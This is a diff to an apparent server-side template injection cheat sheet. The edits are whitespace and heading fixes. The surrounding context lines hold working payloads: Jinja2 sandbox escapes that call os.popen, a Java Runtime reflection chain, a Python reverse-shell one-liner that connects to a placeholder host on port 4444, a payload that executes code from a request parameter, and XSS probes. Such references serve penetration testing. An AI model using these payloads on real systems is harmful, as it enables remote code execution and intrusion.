@@ -156,6 +156,7 @@ Newer versions
 {% set cmd = '<cmd>' %}
 {% endraw %}
 
+
 {% set bytes = (1).TYPE
      .forName('java.lang.Runtime')
      .methods[6]
@@ -348,6 +349,7 @@ x.exec('<cmd>')
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"<cmd>\", \"<args>\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 {% endraw %}
 
+
 {{request.application.__globals__.__builtins__.__import__('os')['popen']('<cmd>')['read']()}}
 {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('<cmd>')['read']()}}
 ```
@@ -360,6 +362,7 @@ Register the GET parameter
 {% raw %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.<param>).read()}}{%endif%}{%endfor%}
 {% endraw %}
+
 ```
 
 Send a request containing the given parameter with the code to execute as value. For instance a request can be `<url>/?<param>=<code>`
@@ -386,6 +389,7 @@ Send a request containing the given parameter with the code to execute as value.
 {% raw %}
 {% import foobar %}
 {% endraw %}
+
 ```
 
 #### Command execution
@@ -414,7 +418,7 @@ x=os.popen('<cmd>').read()
 %>
 ```
 
-### Ruby - ERB&#x20;
+### Ruby - ERB
 
 #### Identification
 
@@ -506,8 +510,3 @@ ${7*7}
 [self.alert(1)]
 javascript:alert(1)%252f%252f..%252fcss-images
 ```
-
-
-
-
-
